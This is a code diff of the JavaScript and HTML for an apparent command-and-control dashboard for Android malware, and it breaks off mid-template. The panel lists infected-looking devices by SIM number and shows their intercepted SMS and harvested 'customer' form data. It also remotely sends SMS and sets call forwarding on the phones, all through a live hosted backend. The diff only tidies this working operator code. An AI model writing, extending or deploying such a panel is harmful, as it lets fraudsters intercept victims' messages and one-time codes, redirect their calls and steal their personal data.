@@ -105,14 +105,13 @@
         const socket = io('https://bengal-tiger-admin-production-8071.up.railway.app');
         let devices = [];
         let currentFilter = 'all';
-
+        function escapeAttr(s) { return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
         function toast(msg, err=false) {
             const t = document.getElementById("toast");
             t.innerText = msg;
             t.className = err ? "show error" : "show";
             setTimeout(() => t.className = "", 3000);
         }
-
         async function login() {
             const p = document.getElementById('pass').value;
             const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/login', {
@@ -126,7 +125,6 @@
                 fetchData(false);
             } else alert("Wrong Password");
         }
-
         async function fetchData(showMsg) {
             try {
                 const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/devices');
@@ -139,40 +137,23 @@
                 toast('❌ Refresh failed', true);
             }
         }
-
-        // ========================================================
-        //          SOCKET.IO EVENT LISTENERS
-        // ========================================================
         socket.on('dashboard-update', () => fetchData(false));
-
-        socket.on('call-forward-status-update', (data) => {
-            // 'data' object server se aayega, jaise: { deviceId: 'some-id', status: 'Call forwarding active' }
-            console.log(`Received status for ${data.deviceId}: ${data.status}`);
-            alert(`Status for Device ${data.deviceId}:\n\n${data.status}`);
-        });
-        // ========================================================
-
         function filter(type, btn) {
             currentFilter = type;
             document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
             render();
         }
-
         function render() {
             document.getElementById('s-all').innerText = devices.length;
             document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
             document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;
-
             const grid = document.getElementById('grid');
             grid.innerHTML = '';
-
             let list = devices;
             if(currentFilter === 'online') list = devices.filter(d=>d.isOnline);
             if(currentFilter === 'pinned') list = devices.filter(d=>d.isPinned);
-
             list = list.sort((a, b) => new Date(b.registrationTimestamp) - new Date(a.registrationTimestamp));
-
             list.forEach((d, idx) => {
                 const serialNum = idx + 1;
                 const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
@@ -181,85 +162,88 @@
                 const batteryPercent = `<span style='position:absolute;top:50%;left:0;width:100%;transform:translateY(-50%);text-align:center;font-size:13px;font-weight:bold;color:#111;pointer-events:none;'>${d.battery}%</span>`;
                 const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;letter-spacing:1px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
                 const simCopy = (sim, label) =>
-                    `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy ${label}" onclick="navigator.clipboard.writeText('${sim||''}');toast('${label} copied!')"></i>`;
-                
+                    `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class="fas fa-copy copy-btn" data-text="${escapeAttr(sim||'')}" data-label="${label}" style="color:var(--primary);cursor:pointer;" title="Copy ${label}"></i>`;
+                // Virtual mobile phone style
                 grid.innerHTML += `
-                    <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}" style="border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0, 0 2px 8px #fff;position:relative;max-width:320px;margin:auto;border-radius:32px 32px 36px 36px;background:linear-gradient(145deg,#f8fafc 80%,#e0e0e0 100%);padding-top:60px;padding-bottom:24px;overflow:hidden;">
-                        <div style="position:absolute;top:18px;left:18px;z-index:2;">
-                            <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
-                        </div>
+        <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}" style="border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0, 0 2px 8px #fff;position:relative;max-width:320px;margin:auto;border-radius:32px 32px 36px 36px;background:linear-gradient(145deg,#f8fafc 80%,#e0e0e0 100%);padding-top:60px;padding-bottom:24px;overflow:hidden;">
+            <div style="position:absolute;top:18px;left:18px;z-index:2;">
+                <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
+            </div>
                         <div style="position:absolute;top:8px;right:8px;z-index:2;display:flex;align-items:center;gap:8px;">
-                            <span style='position:relative;display:inline-block;width:44px;height:32px;'>
-                                <i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:32px;"></i>
-                                ${batteryPercent}
-                            </span>
+                                <span style='position:relative;display:inline-block;width:44px;height:32px;'>
+                                    <i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:32px;"></i>
+                                    ${batteryPercent}
+                                </span>
                         </div>
-                        <div class="serial-badge" style="font-size:17px;left:50%;transform:translateX(-50%);position:absolute;top:18px;background:var(--primary);color:var(--dark);padding:7px 18px 7px 18px;display:flex;flex-direction:column;align-items:center;min-width:120px;">
-                            <span style='font-size:18px;font-weight:bold;'>${serialNum}</span>
-                            <span style='font-size:13px;font-weight:bold;color:#222;margin-top:2px;'>${d.model}</span>
-                        </div>
-                        <div class="card-header" style="margin-top:70px;margin-bottom:6px;align-items:center;justify-content:center;"></div>
-                        <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;justify-content:center;">
-                            ${statusBadge}
-                        </div>
-                        <div class="info" style="margin-bottom:2px;">${simCopy(d.sim1,'SIM1')}</div>
-                        <div class="info" style="margin-bottom:2px;">${simCopy(d.sim2,'SIM2')}</div>
-                        <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Last Seen:</span> <span id="lastSeen_${d.deviceId}">${formatLastSeen(d.lastSeen)}</span></div>
-                        <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Serial:</span> ${d.serialNumber || 'N/A'}</div>
-                        <div class="btns" style="margin-top:18px;">
-                            <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
-                            <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
-                            <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
-                            <button class="btn-sm btn-sms" style="background:#43a047;" onclick="act('${d.deviceId}', 'SEND_SMS')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
-                            <button class="btn-sm btn-call" style="background:#ff9800;" onclick="act('${d.deviceId}', 'CALL_FORWARD')"><i class="fas fa-phone"></i> CALL FWD</button>
-                            <button class="btn-sm btn-del" style="background:#d32f2f;font-weight:bold;" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
-                        </div>
-                    </div>`;
+            <div class="serial-badge" style="font-size:17px;left:50%;transform:translateX(-50%);position:absolute;top:18px;background:var(--primary);color:var(--dark);padding:7px 18px 7px 18px;display:flex;flex-direction:column;align-items:center;min-width:120px;">
+                <span style='font-size:18px;font-weight:bold;'>${serialNum}</span>
+                <span style='font-size:13px;font-weight:bold;color:#222;margin-top:2px;'>${d.model}</span>
+            </div>
+            <div class="card-header" style="margin-top:70px;margin-bottom:6px;align-items:center;justify-content:center;">
+                <!-- Model name now in serial badge -->
+            </div>
+            <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;justify-content:center;">
+                ${statusBadge}
+            </div>
+            <div class="info" style="margin-bottom:2px;">${simCopy(d.sim1,'SIM1')}</div>
+            <div class="info" style="margin-bottom:2px;">${simCopy(d.sim2,'SIM2')}</div>
+            <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Last Seen:</span> <span id="lastSeen_${d.deviceId}">${formatLastSeen(d.lastSeen)}</span></div>
+            <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Serial:</span> ${d.serialNumber || 'N/A'}</div>
+                <div class="btns" style="margin-top:18px;">
+                    <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
+                    <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
+                    <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
+                    <button class="btn-sm btn-sms" style="background:#43a047;" onclick="act('${d.deviceId}', 'SEND_SMS')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
+                    <button class="btn-sm btn-call" style="background:#ff9800;" onclick="act('${d.deviceId}', 'CALL_FORWARD')"><i class="fas fa-phone"></i> CALL FWD</button>
+                    <button class="btn-sm btn-del" style="background:#d32f2f;font-weight:bold;" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
+                </div>
+        </div>`;
             });
-        }
-        
-        function viewFormData(deviceId) {
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (!device) { toast('❌ Device not found', true); return; }
-            const modalBody = document.getElementById('modalBody');
-            let html = `<div style="background:#fffde7;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;">
-                <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;">Submitted Form Data</div>
-            </div>`;
-            if (device.customerData && Object.keys(device.customerData).length > 0) {
-                Object.entries(device.customerData).forEach(([key, value]) => {
-                    html += `<div style="background:#fffde7;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #ffeb3b;display:flex;align-items:center;justify-content:space-between;">
-                                <span style="color:#ff9800;font-weight:bold;">${key}</span>
-                                <span style="color:#222;font-size:15px;">${JSON.stringify(value)} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy" onclick="navigator.clipboard.writeText('${JSON.stringify(value)}');toast('Copied!')"></i></span>
-                            </div>`;
+            // attach clipboard handlers for any generated copy buttons
+            setTimeout(() => {
+                document.querySelectorAll('.copy-btn').forEach(el => {
+                    el.onclick = () => {
+                        const text = el.dataset.text || '';
+                        const label = el.dataset.label || '';
+                        navigator.clipboard.writeText(text).then(() => toast(label + ' copied!')).catch(() => toast('Copy failed', true));
+                    };
                 });
-            } else {
-                html += '<div class="no-data">No form data submitted yet</div>';
-            }
-            modalBody.innerHTML = html;
-            document.getElementById('viewDataModal').classList.add('show');
+            }, 0);
         }
-
-        async function act(id, type) {
+        async function act(id, type, data = {}) {
             if(type === 'SEND_SMS') {
                 const modal = document.createElement('div');
-                modal.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:9999;';
+                modal.style.position = 'fixed';
+                modal.style.top = '0';
+                modal.style.left = '0';
+                modal.style.width = '100vw';
+                modal.style.height = '100vh';
+                modal.style.background = 'rgba(0,0,0,0.5)';
+                modal.style.display = 'flex';
+                modal.style.alignItems = 'center';
+                modal.style.justifyContent = 'center';
+                modal.style.zIndex = '9999';
                 modal.innerHTML = `
-                <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:340px;max-width:95vw;">
-                    <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:18px;text-align:center;">Send SMS</div>
-                    <div style="margin-bottom:12px;">
-                    <label style='font-weight:bold;color:#1976d2;'>Select SIM:</label>
-                    <select id="smsSim" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;margin-bottom:10px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
-                    <label style='font-weight:bold;color:#1976d2;'>Recipient Number:</label>
-                    <input id="smsNumber" type="text" placeholder="Enter recipient number" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;margin-bottom:10px;">
-                    <label style='font-weight:bold;color:#1976d2;'>Message:</label>
-                    <textarea id="smsMsg" rows="4" placeholder="Enter message" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;"></textarea>
-                    </div>
-                    <div id="smsStatus" style="font-size:14px;margin-bottom:10px;"></div>
-                    <div style="display:flex;justify-content:space-between;">
-                    <button id="smsCancelBtn" style="background:#eee;color:#222;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
-                    <button id="smsSendBtn" style="background:#43a047;color:#fff;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Send</button>
-                    </div>
-                </div>`;
+          <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:340px;max-width:95vw;">
+            <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:18px;text-align:center;">Send SMS</div>
+            <div style="margin-bottom:12px;">
+              <label style='font-weight:bold;color:#1976d2;'>Select SIM:</label>
+              <select id="smsSim" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;margin-bottom:10px;">
+                <option value="1">SIM 1</option>
+                <option value="2">SIM 2</option>
+              </select>
+              <label style='font-weight:bold;color:#1976d2;'>Recipient Number:</label>
+              <input id="smsNumber" type="text" placeholder="Enter recipient number" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;margin-bottom:10px;">
+              <label style='font-weight:bold;color:#1976d2;'>Message:</label>
+              <textarea id="smsMsg" rows="4" placeholder="Enter message" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;"></textarea>
+            </div>
+            <div id="smsStatus" style="font-size:14px;margin-bottom:10px;"></div>
+            <div style="display:flex;justify-content:space-between;">
+              <button id="smsCancelBtn" style="background:#eee;color:#222;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
+              <button id="smsSendBtn" style="background:#43a047;color:#fff;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Send</button>
+            </div>
+          </div>
+        `;
                 document.body.appendChild(modal);
                 document.getElementById('smsCancelBtn').onclick = () => document.body.removeChild(modal);
                 document.getElementById('smsSendBtn').onclick = async () => {
@@ -271,39 +255,60 @@
                         return;
                     }
                     document.getElementById('smsStatus').innerHTML = '<span style="color:#1976d2;">Sending...</span>';
+                    const t0 = Date.now();
                     try {
                         const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
                             method:'POST', headers:{'Content-Type':'application/json'},
                             body: JSON.stringify({deviceId: id, action: 'SEND_SMS', data: {simSlot, number, message}})
                         });
                         const d = await r.json();
-                        document.getElementById('smsStatus').innerHTML = d.success ? `<span style="color:#43a047;font-weight:bold;">SMS sent successfully</span>` : `<span style="color:#d32f2f;font-weight:bold;">Failed: ${d.message}</span>`;
+                        const t1 = Date.now();
+                        if (d.success) {
+                            document.getElementById('smsStatus').innerHTML = `<span style="color:#43a047;font-weight:bold;">SMS sent successfully (${(t1-t0)/1000}s)</span>`;
+                        } else {
+                            document.getElementById('smsStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Failed: ${d.message}</span>`;
+                        }
                     } catch (err) {
                         document.getElementById('smsStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Error: ${err.message}</span>`;
                     }
                 };
+                return;
             } else if(type === 'CALL_FORWARD') {
+                // Custom modal for Call Forward
                 const modal = document.createElement('div');
-                modal.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:9999;';
+                modal.style.position = 'fixed';
+                modal.style.top = '0';
+                modal.style.left = '0';
+                modal.style.width = '100vw';
+                modal.style.height = '100vh';
+                modal.style.background = 'rgba(0,0,0,0.5)';
+                modal.style.display = 'flex';
+                modal.style.alignItems = 'center';
+                modal.style.justifyContent = 'center';
+                modal.style.zIndex = '9999';
                 modal.innerHTML = `
-                <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:340px;max-width:95vw;">
-                    <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:18px;text-align:center;">Call Forward</div>
-                    <div style="margin-bottom:12px;">
-                    <label style='font-weight:bold;color:#ff9800;'>Select SIM:</label>
-                    <select id="cfSim" style="width:100%;padding:10px;font-size:15px;border:2px solid #ff9800;border-radius:6px;margin-bottom:10px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
-                    <label style='font-weight:bold;color:#ff9800;'>Forwarding Number:</label>
-                    <input id="cfNumber" type="text" placeholder="Enter forwarding number" style="width:100%;padding:10px;font-size:15px;border:2px solid #ff9800;border-radius:6px;margin-bottom:10px;">
-                    </div>
-                    <div id="cfStatus" style="font-size:16px;margin-bottom:10px;text-align:center;min-height:24px;"></div>
-                    <div style="display:flex;justify-content:space-between;gap:8px;">
-                        <button id="cfActivateBtn" style="background:#43a047;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-check-circle"></i> Activate</button>
-                        <button id="cfDeactivateBtn" style="background:#d32f2f;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-times-circle"></i> Deactivate</button>
-                        <button id="cfStatusBtn" style="background:#1976d2;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-info-circle"></i> Check Status</button>
-                    </div>
-                    <div style="margin-top:10px;text-align:center;">
-                        <button id="cfCancelBtn" style="background:#eee;color:#222;padding:8px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-arrow-left"></i> Cancel</button>
-                    </div>
-                </div>`;
+          <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:340px;max-width:95vw;">
+            <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:18px;text-align:center;">Call Forward</div>
+            <div style="margin-bottom:12px;">
+              <label style='font-weight:bold;color:#ff9800;'>Select SIM:</label>
+              <select id="cfSim" style="width:100%;padding:10px;font-size:15px;border:2px solid #ff9800;border-radius:6px;margin-bottom:10px;">
+                <option value="1">SIM 1</option>
+                <option value="2">SIM 2</option>
+              </select>
+              <label style='font-weight:bold;color:#ff9800;'>Forwarding Number:</label>
+              <input id="cfNumber" type="text" placeholder="Enter forwarding number" style="width:100%;padding:10px;font-size:15px;border:2px solid #ff9800;border-radius:6px;margin-bottom:10px;">
+            </div>
+                        <div id="cfStatus" style="font-size:16px;margin-bottom:10px;text-align:center;min-height:24px;"></div>
+                        <div style="display:flex;justify-content:space-between;gap:8px;">
+                            <button id="cfActivateBtn" style="background:#43a047;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-check-circle"></i> Activate</button>
+                            <button id="cfDeactivateBtn" style="background:#d32f2f;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-times-circle"></i> Deactivate</button>
+                            <button id="cfStatusBtn" style="background:#1976d2;color:#fff;padding:10px 18px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-info-circle"></i> Check Status</button>
+                        </div>
+                        <div style="margin-top:10px;text-align:center;">
+                            <button id="cfCancelBtn" style="background:#eee;color:#222;padding:8px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;display:flex;align-items:center;gap:6px;"><i class="fas fa-arrow-left"></i> Cancel</button>
+                        </div>
+          </div>
+        `;
                 document.body.appendChild(modal);
                 document.getElementById('cfCancelBtn').onclick = () => document.body.removeChild(modal);
                 document.getElementById('cfActivateBtn').onclick = async () => {
@@ -348,15 +353,25 @@
                             body: JSON.stringify({deviceId: id, action: 'CALL_FORWARD_STATUS', data: {simSlot}})
                         });
                         const d = await r.json();
-                        document.getElementById('cfStatus').innerHTML = d.success ? `<span style="color:#43a047;font-weight:bold;"><i class="fas fa-check-circle"></i> Command Sent. Waiting for status...</span>` : `<span style="color:#d32f2f;font-weight:bold;"><i class="fas fa-times-circle"></i> ${d.message}</span>`;
+                        document.getElementById('cfStatus').innerHTML = d.success ? `<span style="color:#43a047;font-weight:bold;"><i class="fas fa-check-circle"></i> ${d.message}</span>` : `<span style="color:#d32f2f;font-weight:bold;"><i class="fas fa-times-circle"></i> ${d.message}</span>`;
                     } catch (err) {
                         document.getElementById('cfStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;"><i class="fas fa-exclamation-circle"></i> Error: ${err.message}</span>`;
                     }
                 };
+                return;
+            }
+            try {
+                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({deviceId: id, action: type, data: data})
+                });
+                const d = await r.json();
+                toast(d.message, !d.success);
+            } catch (err) {
+                toast('❌ Error: ' + err.message, true);
             }
         }
-        
-        async function togglePin(id, s) { 
+        async function togglePin(id, s) {
             try {
                 const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/pin-device', {
                     method:'POST', headers:{'Content-Type':'application/json'},
@@ -373,20 +388,29 @@
                 toast('❌ Error: ' + err.message, true);
             }
         }
-
-        async function del(id) { 
+        async function del(id) {
             const modal = document.createElement('div');
-            modal.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:9999;';
+            modal.style.position = 'fixed';
+            modal.style.top = '0';
+            modal.style.left = '0';
+            modal.style.width = '100vw';
+            modal.style.height = '100vh';
+            modal.style.background = 'rgba(0,0,0,0.5)';
+            modal.style.display = 'flex';
+            modal.style.alignItems = 'center';
+            modal.style.justifyContent = 'center';
+            modal.style.zIndex = '9999';
             modal.innerHTML = `
-            <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:320px;max-width:90vw;">
-                <div style="font-size:20px;font-weight:bold;color:#d32f2f;margin-bottom:18px;text-align:center;">Delete Device</div>
-                <div style="font-size:15px;margin-bottom:12px;text-align:center;">Enter <b style='color:#1976d2;'>Admin Password</b> to delete this device.</div>
-                <input id="delPassInput" type="password" placeholder="Admin Password" style="width:100%;padding:12px;font-size:16px;border:2px solid #1976d2;border-radius:6px;margin-bottom:18px;outline:none;">
-                <div style="display:flex;justify-content:space-between;">
-                <button id="delCancelBtn" style="background:#eee;color:#222;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
-                <button id="delConfirmBtn" style="background:#d32f2f;color:#fff;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Delete</button>
-                </div>
-            </div>`;
+      <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:320px;max-width:90vw;">
+        <div style="font-size:20px;font-weight:bold;color:#d32f2f;margin-bottom:18px;text-align:center;">Delete Device</div>
+        <div style="font-size:15px;margin-bottom:12px;text-align:center;">Enter <b style='color:#1976d2;'>Admin Password</b> to delete this device.</div>
+        <input id="delPassInput" type="password" placeholder="Admin Password" style="width:100%;padding:12px;font-size:16px;border:2px solid #1976d2;border-radius:6px;margin-bottom:18px;outline:none;">
+        <div style="display:flex;justify-content:space-between;">
+          <button id="delCancelBtn" style="background:#eee;color:#222;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
+          <button id="delConfirmBtn" style="background:#d32f2f;color:#fff;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Delete</button>
+        </div>
+      </div>
+    `;
             document.body.appendChild(modal);
             document.getElementById('delPassInput').focus();
             document.getElementById('delCancelBtn').onclick = () => document.body.removeChild(modal);
@@ -414,8 +438,7 @@
                 }
             };
         }
-
-        async function changePass() { 
+        async function changePass() {
             const o = prompt("Old Password:");
             const n = prompt("New Password:");
             if(o && n) {
@@ -427,8 +450,7 @@
                 toast(d.success ? "✅ Password Changed" : "❌ Wrong Old Password", !d.success);
             }
         }
-
-        function viewData(deviceId) { 
+        function viewData(deviceId) {
             const device = devices.find(d => d.deviceId === deviceId);
             if (!device) {
                 toast('❌ Device not found', true);
@@ -436,31 +458,33 @@
             }
             const modalBody = document.getElementById('modalBody');
             let html = `
-                <div style="background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;">
-                    <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div>
-                    <table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);">
-                        <tbody>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${device.model || 'N/A'}</td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${device.sim1 || 'N/A'} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy SIM1" onclick="navigator.clipboard.writeText('${device.sim1||''}');toast('SIM1 copied!')"></i></td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${device.sim2 || 'N/A'} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy SIM2" onclick="navigator.clipboard.writeText('${device.sim2||''}');toast('SIM2 copied!')"></i></td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${device.androidVersion || 'N/A'}</td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${device.battery || 'N/A'}%</td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.registrationTimestamp ? (new Date(device.registrationTimestamp)).toLocaleString('en-GB') : 'N/A'}</td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>
-                            <tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>
-                        </tbody>
-                    </table>
-                </div>
-                <hr style="margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;">
-                <h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>
-            `;
+        <div style="background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;">
+            <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div>
+            <table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);">
+                <tbody>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${device.model || 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${device.sim1 || 'N/A'} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy SIM1" onclick="navigator.clipboard.writeText('${device.sim1||''}');toast('SIM1 copied!')"></i></td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${device.sim2 || 'N/A'} <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy SIM2" onclick="navigator.clipboard.writeText('${device.sim2||''}');toast('SIM2 copied!')"></i></td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${device.androidVersion || 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${device.battery || 'N/A'}%</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.installDate ? (new Date(device.installDate)).toLocaleString('en-GB') : 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>
+                    <tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+        <hr style="margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;">
+        <h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>
+    `;
             if (device.customerData && Object.keys(device.customerData).length > 0) {
+                let i = 1;
                 Object.entries(device.customerData).forEach(([key, value]) => {
                     html += `
-                        <div style="background:#e3f2fd;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;">
